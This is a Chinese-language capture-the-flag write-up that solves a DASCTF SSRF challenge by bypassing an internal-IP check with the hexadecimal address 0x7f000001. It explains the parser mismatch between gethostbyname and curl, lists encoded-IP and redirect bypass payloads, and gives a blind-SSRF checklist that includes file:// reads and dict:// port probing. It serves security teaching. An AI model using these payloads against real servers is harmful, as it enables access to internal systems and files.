# 【DASCTF】SSRF - 内网 IP 绕过

> 平台：DASCTF ｜ flag：`n1book{ug9thaevi2JoobaiLiiLah4zae6fie4r}` ｜ 2026-08-03
> 定位：SSRF 入门第 1 题（内网 IP 检查绕过）

---

## 一、题目面貌

```
SSRF Training 平台（N1BOOK）
首页：表单（参数 url）+ 提示徽章 flag.php / 302.php post url + 链接 challenge.php
技术栈：X-Powered-By: PHP/5.6.40
```

## 二、考点

| 考点 | 内容 |
|---|---|
| SSRF | 提交 URL 让服务器代发请求 |
| 内网 IP 检查绕过 | 十六进制 IP 绕过 gethostbyname 检查 |
| 源码审计 | challenge.php 直接暴露源码（highlight_file） |

---

## 三、解题链（7 步）

### 第 1 步：信息收集
【动作】访问首页
【发现】`PHP/5.6.40`；SSRF 训练平台；表单 url 参数；徽章提示 flag.php / 302.php

### 第 2 步：验证 SSRF
【动作】`POST url=http://127.0.0.1/`
【发现】返回页面出现两遍主页 + `1` → 服务器真的去请求了 → SSRF 实锤

### 第 3 步：读源码（设计图）
【动作】访问 `challenge.php`（highlight_file 打印源码）
【发现】完整逻辑：
```php
$url = $_GET['url'];                      // GET 参数（不是表单 POST）
function check_inner_ip($url) {
    $hostname = parse_url($url)['host'];
    $ip = gethostbyname($hostname);       // 解析主机名成 IP
    // 127.x / 10.x / 172.16-31.x / 192.168.x → 内网 → 拦截
}
function safe_request_url($url) {
    if (check_inner_ip($url)) echo 'is inner ip';   // 内网被拦
    else {
        curl_exec($ch);                   // curl 发请求
        if ($result_info['redirect_url'])
            safe_request_url($result_info['redirect_url']);  // 手动跟302
        var_dump($output);                // 结果回显
    }
}
```

### 第 4 步：看目标
【动作】直接访问 `flag.php`
【发现】200 但空内容 → flag 只对**内网来源**显示

### 第 5 步：正面硬刚（验证拦截）
【动作】`?url=http://127.0.0.1/flag.php`
【发现】`is inner ip` → 内网检查生效

### 第 6 步：分析检查逻辑的缝
【发现】**检查器（gethostbyname）和请求器（curl）不是同一套解析逻辑**
- 检查：把主机名解析成 IP 字符串，比对是否内网段
- 请求：curl 连接，认识各种 IP 变体写法
- 缝 = "检查时不是内网、连接时却是内网"

### 第 7 步：十六进制 IP 绕过
【动作】`?url=http://0x7f000001/flag.php`
【原理】`0x7f000001` = 127.0.0.1
- gethostbyname("0x7f000001") 解析失败 → ip2long=0 → 判为外网 → 放行
- curl 认识 0x7f000001=127.0.0.1 → 连到本机 → 读 flag.php
【结果】**flag = `n1book{ug9thaevi2JoobaiLiiLah4zae6fie4r}`**

---

## 四、SSRF 内网绕过全家桶

| 手法 | 写法 | 说明 |
|---|---|---|
| 十六进制 IP | `http://0x7f000001/` | = 127.0.0.1，检查器不认 |
| 十进制 IP | `http://2130706433/` | = 127.0.0.1 |
| 八进制 | `http://0177.0.0.1/` | = 127.0.0.1 |
| 缩写 | `http://127.1/` | 省略段 |
| 特殊域名 | `http://localhost/` / `http://127.0.0.1.nip.io/` | DNS 指向本机 |
| 302 跳转 | 公开 302.php → 跳内网 | 源码里有递归跟跳转逻辑 |

## 四·5 为什么能绕过（解析器不一致 - 核心原理）

```
同一个地址，两个"人"两种理解：
  检查员(gethostbyname+ip2long)  → 只认点分十进制 127.0.0.1 → 看不懂 0x7f000001 → 判"外网" → 放行
  快递员(curl/libcurl)            → 认识十六/十/八进制、缩写    → 认出 = 127.0.0.1 → 连本机
缝 = 过滤器的解析器 ≠ 实际请求的解析器，两者能力不同
```

- PHP 内置 `ip2long` 手册明文规定"只认 dotted IPv4 address"，`gethostbyname` 解析失败原样返回
- curl 的 libcurl 按老 Unix `inet_aton` 宽松规则，兼容多种进制写法
- 这是 SSRF 绕过的**经典考点**：Parser Differential（解析器不一致）

**诚实标注证据来源**：
- 0x7f000001 真的绕过检查 → 亲手实测 ✅
- gethostbyname 解析失败 → 本机 Python 模拟佐证（getaddrinfo 对 0x7f000001 报错）+ 手册行为
- 第二次想用 2130706433 再实测 → 靶机过期（Target not found）没跑成

## 五、盲打 SSRF 流程（看不懂源码也能做）

> 核心认知：不需要"读懂"源码，只需要"认出模式 + 套清单"。模式特征：**页面有让你填 URL 的参数，服务器会去访问它**。比赛里很多 SSRF 题根本没源码（盲 SSRF），全靠这套流程。

```
第1步 找入口   页面 url 参数 / 扫描器发现 challenge.php / 表单
第2步 验证SSRF 提交 http://127.0.0.1/ → 回显变化 = SSRF 实锤
第3步 试经典全家桶（背下来）：
    http://127.0.0.1/flag.php   被拦? 换↓
    http://0x7f000001/flag.php  十六进制
    http://2130706433/flag.php  十进制
    http://0177.0.0.1/flag.php  八进制
    http://127.1/flag.php       缩写
    http://localhost/flag.php
    另可试 file:///flag 读文件、dict:// 探测端口
第4步 猜目标   flag.php / flag / admin / 内网端口(80/8080/3306)
第5步 看结果   回显有东西 → 成了；没回显 → 盲SSRF用DNS/时间侧信道
```

**长期策略**：现在每题学透"为什么"（打地基）；比赛靠"模式识别 + 背熟清单"快速执行。看不懂代码 → 不慌 → 先跑盲打流程 → 看回显说话。

## 五、心法

1. **读源码 = 找缝**：SSRF 绕过的万法之源 = "检查解析器 ≠ 请求解析器"，两者不一致就有缝
2. **入口要看清**：这题真正入口是 `challenge.php?url=`（GET），不是首页表单（POST）
3. **目标只对内网显示**：flag.php 对外是空的，必须从内网访问
4. **提示徽章是线索**：flag.php + 302.php 直接告诉你目标和方法

---

## 相关笔记
- Web笔记12-服务器架构与文件系统（概念）
